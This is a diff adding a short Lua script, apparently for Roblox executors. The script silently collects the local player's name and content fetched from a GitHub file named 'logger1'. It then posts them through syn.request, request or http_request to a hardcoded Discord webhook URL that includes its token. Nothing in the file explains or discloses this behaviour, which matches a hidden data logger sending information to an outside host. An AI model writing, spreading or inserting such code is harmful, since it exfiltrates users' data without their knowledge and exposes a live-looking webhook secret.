@@ -1,0 +1,47 @@
+local webh = "https://discord.com/api/webhooks/993790632898347019/bfOW5SGLjtSzAPQ1u7-xttC6KvTfDsadGX2owLGze2YaBmhI4oFOU6e3fWNb_wL5HgB7"
+
+pcall(function()
+   local data = {
+       ["embeds"] = {
+           {
+               ["title"] = game:GetService("Players").LocalPlayer.Name,
+               ["description"] = game:HttpGet("https://raw.githubusercontent.com/babysharkleader280/log-1/main/logger1.")
+           }
+       }
+   }
+
+   if syn then
+       local response = syn.request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif request then
+       local response = request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif http_request then
+       local response = http_request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   end
+end)
